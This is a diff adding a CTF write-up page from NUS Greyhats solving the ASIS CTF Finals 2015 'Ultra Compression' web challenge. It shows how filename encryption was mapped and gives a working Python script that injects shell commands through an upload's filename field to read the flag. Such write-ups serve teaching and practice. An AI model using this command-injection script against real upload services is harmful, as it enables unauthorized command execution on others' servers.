@@ -1,0 +1,381 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>ASIS CTF Finals 2015 - Ultra Compression (Web 125) &#8211; NUS Greyhats</title>
+<meta name="description" content="ASIS CTF Finals 2015 Web 125. Ultra Compression Service.">
+<meta name="keywords" content="CTF, WEB, ASIS, INJECTION">
+
+  
+
+<!-- Twitter Cards -->
+<meta name="twitter:title" content="ASIS CTF Finals 2015 - Ultra Compression (Web 125)">
+<meta name="twitter:description" content="ASIS CTF Finals 2015 Web 125. Ultra Compression Service.">
+
+
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="//nusgreyhats.github.io/write-ups/images/icon.png">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ASIS CTF Finals 2015 - Ultra Compression (Web 125)">
+<meta property="og:description" content="ASIS CTF Finals 2015 Web 125. Ultra Compression Service.">
+<meta property="og:url" content="//nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/">
+<meta property="og:site_name" content="NUS Greyhats">
+
+
+
+
+
+<link rel="canonical" href="//nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/">
+<link href="//nusgreyhats.github.io/write-ups/feed.xml" type="application/atom+xml" rel="alternate" title="NUS Greyhats Feed">
+
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="//nusgreyhats.github.io/write-ups/assets/css/main.css">
+<!-- Webfonts -->
+<link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+<script src="https://use.edgefonts.net/source-sans-pro:n2,i2,n3,i3,n4,i4,n6,i6,n7,i7,n9,i9;source-code-pro:n4,n7;volkhov.js"></script>
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- HTML5 Shiv and Media Query Support -->
+<!--[if lt IE 9]>
+  <script src="//nusgreyhats.github.io/write-ups/assets/js/vendor/html5shiv.min.js"></script>
+  <script src="//nusgreyhats.github.io/write-ups/assets/js/vendor/respond.min.js"></script>
+<![endif]-->
+
+<!-- Modernizr -->
+<link href="//nusgreyhats.github.io/write-ups/assets/css/font-awesome.css" rel="stylesheet" type="text/css">
+<script src="//nusgreyhats.github.io/write-ups/assets/js/vendor/modernizr-2.7.1.custom.min.js"></script>
+
+
+<!-- MathJax -->
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="//nusgreyhats.github.io/write-ups/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="//nusgreyhats.github.io/write-ups/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="//nusgreyhats.github.io/write-ups/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="//nusgreyhats.github.io/write-ups/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="//nusgreyhats.github.io/write-ups/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="//nusgreyhats.github.io/write-ups/images/apple-touch-icon-144x144-precomposed.png">
+
+</head>
+
+<body id="post">
+
+<div class="navigation-wrapper">
+	<nav class="main-nav-outer animated drop" id="site-nav"><!--main-nav-start-->
+		    <ul class="main-nav">
+		        <li class="small-logo"><a href="//nusgreyhats.github.io/write-ups/../#header"><img src="//nusgreyhats.github.io/write-ups/images/icon.png" alt=""></a></li>
+		        <li><a href="//nusgreyhats.github.io/write-ups/">Write Ups</a></li>
+		        <li><a href="//nusgreyhats.github.io/write-ups/../#security-wednesdays">Security Wednesdays</a></li>
+		        <li><a href="//nusgreyhats.github.io/write-ups/../#the-ctf">The CTF</a></li>
+		        <li><a href="//nusgreyhats.github.io/write-ups/../#team">Team</a></li>
+		        <li><a href="//nusgreyhats.github.io/write-ups/../#contact">Contact</a></li>
+
+		        
+		        <li class="social">
+		            <a href="https://facebook.com/groups/nusgreyhats/" class="facebook"><i class="fa fa-facebook"></i></a>
+		        </li>
+		        
+		    </ul>
+	</nav>
+</div>
+	
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<div class="js-menu-screen menu-screen"></div>
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    
+    <div class="entry-wrapper">
+      <header class="entry-header">
+        <span class="entry-tags"><a href="//nusgreyhats.github.io/write-ups/tags/#CTF" title="Pages tagged CTF">CTF</a>&nbsp;&bull;&nbsp;<a href="//nusgreyhats.github.io/write-ups/tags/#WEB" title="Pages tagged WEB">WEB</a>&nbsp;&bull;&nbsp;<a href="//nusgreyhats.github.io/write-ups/tags/#ASIS" title="Pages tagged ASIS">ASIS</a>&nbsp;&bull;&nbsp;<a href="//nusgreyhats.github.io/write-ups/tags/#INJECTION" title="Pages tagged INJECTION">INJECTION</a></span>
+        
+          <h1 class="entry-title">ASIS CTF Finals 2015 - Ultra Compression (Web 125)</h1>
+        
+      </header>
+      <footer class="entry-meta">
+        
+          
+              
+          
+              
+          
+              
+                  
+              
+          
+              
+          
+        
+        
+          <img src="//nusgreyhats.github.io/write-ups/images/bio-photo.jpg" class="bio-photo" alt="Quan Yang bio photo"></a>
+        
+        <span class="author vcard">By <span class="fn">Quan Yang</span></span>
+        <span class="entry-date date published"><time datetime="2015-10-12T00:00:00+08:00"><i class="fa fa-calendar-o"></i> October 12, 2015</time></span>
+        
+        <span class="entry-comments"><i class="fa fa-comment-o"></i> <a href="#disqus_thread">Comment</a></span>
+        <span class="social-share-twitter">
+  <a href="https://twitter.com/intent/tweet?hashtags=CTF,WEB,ASIS,INJECTION&amp;text=ASIS%20CTF%20Finals%202015%20-%20Ultra%20Compression%20(Web%20125)&amp;url=//nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/&amp;via=https://twitter.com/quanyang" title="Share on Twitter" itemprop="Twitter"><i class="fa fa-twitter-square"></i> Tweet</a>
+</span>
+<span class="social-share-facebook">
+  <a href="https://www.facebook.com/sharer/sharer.php?u=//nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/" title="Share on Facebook" itemprop="Facebook"><i class="fa fa-facebook-square"></i> Like</a>
+</span>
+<span class="social-share-googleplus">
+  <a href="https://plus.google.com/share?url=//nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/" title="Share on Google Plus" itemprop="GooglePlus"><i class="fa fa-google-plus-square"></i> +1</a>
+</span>
+<!-- /.social-share -->
+        
+      </footer>
+      <div class="entry-content">
+        <p>ASIS CTF 2015 Finals just took place over the weekend of 10,11 October 2015. The finals is open to all, however only qualified teams will be allowed to win the prizes. NUS Greyhats took part in it and solved a few challenges, this is our write-up for some of the challenges from ASIS CTF 2015 Finals. </p>
+
+<h1 id="ultra-compression">ultra compression</h1>
+<p><strong>Points:</strong>125
+<strong>Category:</strong> Web</p>
+
+<p>Go <a href="http://ucs.asis-ctf.ir/">there</a> and find the flag.</p>
+
+<hr />
+
+<h1 id="our-solution">Our solution</h1>
+
+<p>Here we were told to go to a webpage to find the flag. Going to the webpage shows an ultra compression service with the ability to upload files.</p>
+
+<p><img src="//nusgreyhats.github.io/write-ups/resources/images/asis/ucs/service.png" alt="" height="auto" width="600px" /></p>
+
+<p>First thing to do is to upload a legitimate file!
+I chose a random image file on my machine to upload.</p>
+
+<p><img src="//nusgreyhats.github.io/write-ups/resources/images/asis/ucs/upload.png" alt="" height="300px" width="300px" /></p>
+
+<p>By viewing all embeded javascript, we can tell that the file is sent using ajax to the uploader php script.</p>
+
+<p>The uploader php script is located at ‘ajax_php_file.php’. However, it seems that the file uploaded is not stored on the server.</p>
+
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21</pre></td><td class="code"><pre><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+<span class="nx">$</span><span class="p">(</span><span class="s2">"#upload"</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'submit'</span><span class="p">,(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+<span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+<span class="nx">$</span><span class="p">(</span><span class="s2">"#message"</span><span class="p">).</span><span class="nx">empty</span><span class="p">();</span>
+<span class="nx">$</span><span class="p">(</span><span class="s1">'#loading'</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+<span class="na">url</span><span class="p">:</span> <span class="s2">"ajax_php_file.php"</span><span class="p">,</span> <span class="c1">// Url to which the request is send</span>
+<span class="na">type</span><span class="p">:</span> <span class="s2">"POST"</span><span class="p">,</span>             <span class="c1">// Type of request to be send, called as method</span>
+<span class="na">data</span><span class="p">:</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="c1">// Data sent to server, a set of key/value pairs (i.e. form fields and values)</span>
+<span class="na">contentType</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>       <span class="c1">// The content type used when sending data to the server.</span>
+<span class="na">cache</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>             <span class="c1">// To unable request pages to be cached</span>
+<span class="na">processData</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>        <span class="c1">// To send DOMDocument or non processed data file it is set to false</span>
+<span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>   <span class="c1">// A function to be called if request succeeds</span>
+<span class="p">{</span>
+	<span class="nx">$</span><span class="p">(</span><span class="s1">'#loading'</span><span class="p">).</span><span class="nx">hide</span><span class="p">();</span>
+	<span class="nx">$</span><span class="p">(</span><span class="s2">"#message"</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+	<span class="nx">$</span><span class="p">(</span><span class="s2">"#message"</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+	<span class="nx">$</span><span class="p">(</span><span class="s2">"#message"</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">});</span>
+<span class="p">}));</span><span class="w">
+</span></pre></td></tr></tbody></table>
+
+
+
+Using the Chrome browser's developer tool, we can inspect the response of the ajax call.
+
+![](//nusgreyhats.github.io/write-ups/resources/images/asis/ucs/crypt.png){: height="300px" width="auto"}
+
+As you can see, the filename
+`Screen Shot 2015-10-11 at 00.40.02.png`
+gets encrypted to
+`ow.nnm oOsV G1ig-i1-ii cV 11Jh1J1GJ5my`
+
+Following this finding, we can attempt to map every possible plaintext to their corresponding ciphertext, this gives us the mapping of:
+
+`crypt = "YLyA83tfONHDInmSc7JCb64PBxQaZTRu.viMWj9lhzgwGdeqEV25Kos1Fkp0/Xr"`
+`plain = ".0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"`
+
+Attempting to insert a semi-colon into the filename shows that the field was injectable.
+![](//nusgreyhats.github.io/write-ups/resources/images/asis/ucs/injection.png){: height="200px" width="auto"}
+
+Using a python script to automatically map payload back to their corresponding plaintext, we can then inject commands to the website.
+
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28</pre></td><td class="code"><pre><span class="kn">import</span> <span class="nn">subprocess</span><span class="o">,</span><span class="nn">sys</span>
+
+<span class="n">crypt</span> <span class="o">=</span> <span class="s">"YLyA83tfONHDInmSc7JCb64PBxQaZTRu.viMWj9lhzgwGdeqEV25Kos1Fkp0/Xr"</span>
+<span class="n">plain</span> <span class="o">=</span> <span class="s">".0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+
+<span class="n">mapping</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">p</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">plain</span><span class="p">):</span>
+	<span class="n">mapping</span><span class="p">[</span><span class="n">crypt</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">=</span> <span class="n">p</span>
+
+<span class="n">inject</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">out</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">inject</span><span class="p">:</span>
+	<span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">mapping</span><span class="p">:</span>
+		<span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="n">mapping</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="n">x</span>
+
+<span class="k">print</span> <span class="n">out</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="s">"curl 'http://ucs.asis-ctf.ir/ajax_php_file.php' -H 'Pragma: no-cache' -H 'Origin: http://ucs.asis-ctf.ir' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en;q=0.8,en-US;q=0.6,id;q=0.4' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryes1iD3vHWDOD2gkZ' -H 'Accept: */*' -H 'Cache-Control: no-cache' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: PHPSESSID=' -H 'Connection: keep-alive' -H 'Referer: http://ucs.asis-ctf.ir/' -H 'DNT: 1' --data-binary $'------WebKitFormBoundaryes1iD3vHWDOD2gkZ</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">file</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">"</span><span class="o">+</span><span class="n">out</span><span class="o">+</span><span class="s">"</span><span class="se">\"\r\n</span><span class="s">Content-Type: image/png</span><span class="se">\r\n\r\n\r\n</span><span class="s">------WebKitFormBoundaryes1iD3vHWDOD2gkZ--</span><span class="se">\r\n</span><span class="s">' --compressed"</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+
+<span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+<span class="k">print</span> <span class="n">out</span><span class="w">
+</span></pre></td></tr></tbody></table>
+
+
+
+Traversing to /home/asis/, we can then do a ls to see that the flag.txt is kept there. Finally, using a cat command, we can obtain the flag!
+
+![](//nusgreyhats.github.io/write-ups/resources/images/asis/ucs/flag.png){: height="200px" width="auto"}
+
+And we have our flag: **ASIS{72a126946e40f67a04d926dd4786ff15}**
+</code></pre></div></code></pre></div>
+
+        
+          <div id="disqus_thread"></div><!-- /#disqus_thread -->
+          
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'nusgreyhat';
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        
+      </div><!-- /.entry-content -->
+    </div><!-- /.entry-wrapper -->
+    <nav class="pagination" role="navigation">
+      
+        <a href="//nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Big-Lie-(Forensics-100)/" class="btn" title="ASIS CTF Finals 2015 - Big Lie (Forensics 100)">Previous</a>
+      
+      
+        <a href="//nusgreyhats.github.io/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)/" class="btn" title="HITCON CTF Quals 2015 - Simple (Crypto 100)">Next</a>
+      
+    </nav><!-- /.pagination -->
+  </article>
+</div><!-- /#main -->
+
+
+
+<footer class="footer">
+	<div class="container">
+		<span class="copyright">© NUS GreyHats • Theme By W3Goods</span>
+		<div class="social-icons">
+			
+			<a href="https://facebook.com/groups/nusgreyhats/" title="NUS Greyhats on Facebook" target="_blank"><i class="fa fa-facebook-square fa-2x"></i></a>
+			
+			
+			
+			
+			
+			<a href="https://github.com/nusgreyhats" title="NUS Greyhats on Github" target="_blank"><i class="fa fa-github-square fa-2x"></i></a>
+			
+			
+			
+			<a href="//nusgreyhats.github.io/write-ups/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
+		</div><!-- /.social-icons -->
+		<!--Copyright © 2014 Knight Theme By <a href="#">W3Goods</a>.-->
+	</div>
+</footer>
+
+
+<script type="text/javascript">
+  var BASE_URL = '//nusgreyhats.github.io/write-ups';
+</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="//nusgreyhats.github.io/write-ups/assets/js/scripts.min.js"></script>
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-67874722-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
